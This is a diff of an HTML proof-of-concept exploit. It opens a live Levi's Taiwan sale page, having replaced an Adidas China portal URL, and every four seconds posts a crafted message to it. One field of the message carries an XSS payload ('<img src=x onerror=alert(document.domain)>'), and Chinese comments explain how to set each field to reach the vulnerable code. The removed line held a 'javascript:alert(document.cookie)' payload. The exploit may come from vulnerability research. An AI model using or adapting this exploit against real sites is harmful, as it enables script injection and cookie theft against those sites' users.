@@ -1,9 +1,19 @@
 <html>
 <body>
 <script>
-hwin = window.open("https://adifox.adidas.com.cn/portal/#/page/11");
+hwin = window.open("https://www.levis.com.tw/SalePage/Index/11303715");
+const messageData = {
+    MsgHeader: "SizeAI_Fast",  // 核心触发标识
+    DP_CODE: "valid_code",     // 不能是"4_2"或"-1"，可自定义有效值
+    Top_Per: "95%",            // 需显示的百分比数据（示例值）
+    Top_Size: "L",             // 代码中后续逻辑依赖的字段（如RecomText = e.data.Top_Size）
+    Sec_Per: "<img src=x onerror=alert(document.domain)>",            // 代码中用于设置#front_sec_per的字段
+    Sec_Size: "M",             // 代码中用于设置#front_sec_size的字段
+    Auto: true,                // 代码中gtag统计依赖的字段（可选，若不需要统计可设为false）
+    TID: Date.now() - 1000     // 配合Auto的时间戳（需满足 (new Date).getTime() - TID < 79488e5，示例为当前时间减1秒）
+}; 
 setInterval(function(){
- hwin.postMessage('{"type":"portal_new_tab","c":11,"content":{"type":"iframe","url":"javascript:alert(document.cookie)", "table": 1, "title": "xss here", "query": "function"},"params":[{"id":1},"fdsa"]}',"*")
+hwin.postMessage(messageData,"*")
 },4000)
 </script>
 </body>
